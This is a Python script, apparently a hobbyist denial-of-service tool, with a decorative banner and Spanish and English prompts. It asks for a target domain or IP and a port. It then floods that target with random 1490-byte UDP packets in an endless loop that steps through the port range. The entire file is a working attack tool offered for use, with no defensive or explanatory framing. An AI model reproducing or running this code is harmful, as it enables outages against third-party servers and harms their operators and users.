from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back,Style
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  
        command = 'cls'
    os.system(command)
    
def ddos():    
    def banner():
        clearConsole()
        print(Fore.RED+'''

   ⠀    ⢻⣿⣿⣿⣿⣦
⠀        ⢿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣀⣀
       ⣠⣴⣾⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠷⠶⠶⠤⢤⣀
       ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀'''+Style.RESET_ALL+Fore.YELLOW+Style.BRIGHT+'''DDOS'''+Fore.RED+'''⠀⠀⠀⠀⠀⠀⠀⣿⣿⣷⣦⣄⡀
       ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀'''+Fore.YELLOW+'''Domin & IP'''+Fore.RED+'''  ⠀⣿⣿⣿⣿⠿⠛
       ⠿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⠶⠟⠛⠉
⠀⠀        ⣸⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠉
⠀        ⢰⣿⣿⣿⣿⡿⠃
⠀       ⠉⠉⠉⠉⠉
        '''+Style.RESET_ALL)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    def chech_con():
        try:
            request.urlopen('https://www.google.co.in/',timeout=3)
        except KeyboardInterrupt:
            print(Fore.RED+Style.BRIGHT + "Detenido por el usuario..." + Fore.RESET)
            exit()
        except:
            print(Fore.RED+Style.BRIGHT+'Por favor revisa tu conexion  a internet...'+Fore.RESET)
            exit()
 
    try:
        print(Fore.CYAN+Style.BRIGHT+"Comprobando conexion a internet.... "+Fore.RESET)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+Style.BRIGHT+'\r')

        time.sleep(1)
        chech_con()

    except KeyboardInterrupt:
        print(Fore.RED +Style.BRIGHT+ "Detenido por el usuario" + Fore.RESET)
        exit()
    try:
        while True:
            banner()
            print (" ")
            print (" ")
            print(Fore.GREEN+Style.BRIGHT+"  1 /> "+Style.RESET_ALL+Fore.YELLOW+" DDOS with Domin site "+Fore.GREEN+Style.BRIGHT+"\n\n  2 /> "+Style.RESET_ALL+Fore.YELLOW+" DDOS with IP site ")
            opt=str(input(Fore.RED+Style.BRIGHT+"\n\n nenter number for DDOS ? "+Fore.RESET))
            if opt=='1':
                domain=str(input(Fore.CYAN+Style.BRIGHT+" enter domin terget site : "+Fore.RESET))
                ip=socket.gethostbyname(domain)
                break
            elif opt=='2':
                ip = input(Fore.CYAN+Style.BRIGHT+" enter IP site : "+Fore.RESET)
                break
            elif opt=='3':
                time.sleep(1)
                print(Fore.RED+" Please enter the number 1 or 2 "+Fore.RESET)
                exit()
            else:
                print(Fore.RED+'\n  Please enter the number 1 or 2 '+Fore.RESET)
                time.sleep(2)

        port =int(input(Fore.CYAN+Style.BRIGHT+"\nenter number port : "+Fore.RESET))

        print(Fore.YELLOW+Style.BRIGHT+"Iniciando...."+Style.RESET_ALL)
        clearConsole()
        time.sleep(2)

        print(Fore.RED+Back.LIGHTGREEN_EX+" Tack Lorix "+Style.RESET_ALL)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+'\r')
        time.sleep(1)
        sent = 0
    except Exception as e:
        print(Fore.RED+"¡Algo salió mal!")
        print("Razon: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent=sent+1
            port=port+1
            color_list = [Fore.RED+Style.BRIGHT+Back.MAGENTA, Fore.GREEN+Style.BRIGHT+Back.RED, Fore.YELLOW+Style.BRIGHT+Back.GREEN, Fore.BLUE+Style.BRIGHT+Back.CYAN, Fore.MAGENTA+Style.BRIGHT+Back.WHITE, Fore.CYAN+Style.BRIGHT+Back.BLUE, Fore.WHITE+Style.BRIGHT+Back.RED ]
            color_random = random.choice(color_list)

            print(color_random+"aquete %sP enviado %s a través del puerto:%s" % (sent, ip, port))
            if port==65534:
                port=1
            elif port==1900:
                port=1901
    except Exception as e:
        print(Fore.RED+Style.BRIGHT+"Terminado\nRazon: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    except KeyboardInterrupt:
        print(Fore.RED+Style.BRIGHT+"\nDetenido por el usuario"+Fore.RESET)



ddos()
